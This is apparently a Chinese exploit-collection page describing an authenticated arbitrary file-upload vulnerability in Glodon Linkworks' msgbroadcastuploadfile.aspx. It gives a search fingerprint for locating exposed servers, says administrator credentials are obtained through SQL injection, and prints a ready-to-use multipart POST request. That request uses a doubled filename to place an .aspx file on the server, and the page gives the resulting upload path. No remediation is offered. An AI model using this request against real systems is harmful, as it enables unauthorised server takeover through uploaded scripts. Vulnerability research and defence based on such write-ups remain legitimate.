# 广联达 Linkworks msgbroadcastuploadfile.aspx 后台文件上传漏洞

## 漏洞描述

广联达 Linkworks msgbroadcastuploadfile.aspx 存在后台文件上传漏洞，攻击者通过SQL注入获取管理员信息后，可以登陆发送请求包获取服务器权限

## 漏洞影响

广联达 Linkworks

## 网络测绘

web.body="/Services/Identification/"

## 漏洞复现

登陆页面

![img](../../../.vuepress/public/img/1691730736125-bbb199fa-01fb-4790-b2a7-d813481d8d88-20230812091116146.png)

GTP.IM.Services.Group.WebSite.GTP.IM.Services.Group 存在文件上传，上传后在当前目录 Upload下

![img](../../../.vuepress/public/img/1691801728377-50f7e7cb-080f-47fa-9e3d-ad9666fc99c8.png)

通过SQL注入获取管理员账号密码后登陆后台上传文件,验证POC

```php
POST /gtp/im/services/group/msgbroadcastuploadfile.aspx HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
Cookie: 0_styleName=styleA

------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; filename="1.aspx";filename="1.jpg"
Content-Type: application/text

Test

------WebKitFormBoundaryFfJZ4PlAZBixjELj--
```

![img](../../../.vuepress/public/img/1691733300613-63fefc8c-2e2d-478e-97b8-01ce3f9daf56.png)

```php
/GTP/IM/Services/Group/Upload/xxx-xxx-test.aspx
```

![img](../../../.vuepress/public/img/1691802188135-636da27c-837c-432a-88bc-2e215572b2af.png)